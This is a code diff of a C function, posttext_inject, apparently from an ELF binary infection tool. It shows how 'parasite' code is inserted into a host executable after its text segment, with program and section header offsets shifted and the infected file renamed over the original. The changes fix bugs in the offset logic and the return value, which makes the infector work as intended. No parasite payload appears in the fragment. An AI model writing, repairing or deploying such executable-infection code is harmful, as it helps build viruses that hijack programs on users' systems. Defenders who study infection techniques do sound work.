@@ -7,7 +7,7 @@
  * @param parasite filename containing the parasite
  * @param patch_position position in the parasite code to insert the host's code address
  */
-int posttext_inject(Elfit_t *host, char *parasite, uint32_t patch_position)
+uint32_t posttext_inject(Elfit_t *host, char *parasite, uint32_t patch_position)
 {
     unsigned long entry_point, text_offset, text_begin;
     unsigned int entry_offset;
@@ -53,7 +53,7 @@ int posttext_inject(Elfit_t *host, char *parasite, uint32_t patch_position)
     // iterate over phdrs looking for the text segment
     for (i = ehdr->e_phnum; i-- > 0; phdr++)
     {
-        if (text_found) //&& phdr->p_offset >= entry_offset)
+        if (text_found && phdr->p_offset >= entry_offset)
         {
             phdr->p_offset += PAGE_SIZE;
         }
@@ -74,7 +74,7 @@ int posttext_inject(Elfit_t *host, char *parasite, uint32_t patch_position)
     shdr = (Elf32_Shdr *) (host->mem + ehdr->e_shoff);
     for (i = ehdr->e_shnum; i-- > 0; shdr++)
     {
-        if (shdr->sh_offset >= text_offset + entry_offset)
+        if (shdr->sh_offset >= (text_offset + entry_offset))
         {
             shdr->sh_offset += PAGE_SIZE;
         }
@@ -127,8 +127,8 @@ int posttext_inject(Elfit_t *host, char *parasite, uint32_t patch_position)
         exit(-1);
     }
 
-    host->mem += text_offset + entry_offset;
-    if (write(ofd, host->mem, host->file->st_size-preparasite_size_file) 
+    if (write(ofd, host->mem + text_offset + entry_offset, 
+        host->file->st_size-preparasite_size_file) 
         != host->file->st_size-preparasite_size_file)
     {
         perror("tmp binary: write post injection");
@@ -138,5 +138,5 @@ int posttext_inject(Elfit_t *host, char *parasite, uint32_t patch_position)
     rename(TMP, host->name);
     close(ofd);
 
-    return text_offset + entry_offset; 
+    return text_begin + entry_offset; 
 }
